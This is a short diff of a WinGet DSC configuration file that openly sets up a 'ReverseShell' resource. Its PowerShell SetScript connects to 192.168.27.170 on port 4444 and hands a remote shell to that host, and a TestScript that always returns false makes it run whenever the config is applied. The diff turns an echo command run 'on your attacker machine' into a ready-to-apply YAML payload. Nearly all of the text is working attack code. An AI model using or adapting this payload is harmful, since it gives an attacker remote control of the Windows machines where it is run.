@@ -1,19 +1,19 @@
-# On your attacker machine
-echo 'properties:
+$schema: https://aka.ms/ConfigurationDscSchema
+properties:
   configurationVersion: 0.2.0
   resources:
     - resource: PSDscResources/Script
       id: ReverseShell
       directives:
+        description: Reverse Shell via WinGet
         allowPrerelease: true
       settings:
         GetScript: |
-          @{Result="OK"}
+          @{Result = "OK"}
         TestScript: |
           return $false
         SetScript: |
-          $client = New-Object System.Net.Sockets.TcpClient
-          $client.Connect("192.168.27.170", 4444)
+          $client = New-Object System.Net.Sockets.TcpClient("192.168.27.170",4444)
           $stream = $client.GetStream()
           $reader = New-Object System.IO.StreamReader($stream)
           $writer = New-Object System.IO.StreamWriter($stream)
@@ -32,4 +32,4 @@ echo 'properties:
               }
           }
           $writer.Close()
-          $client.Close()' > ~/winget-https/yaml/working-shell.yaml
+          $client.Close()
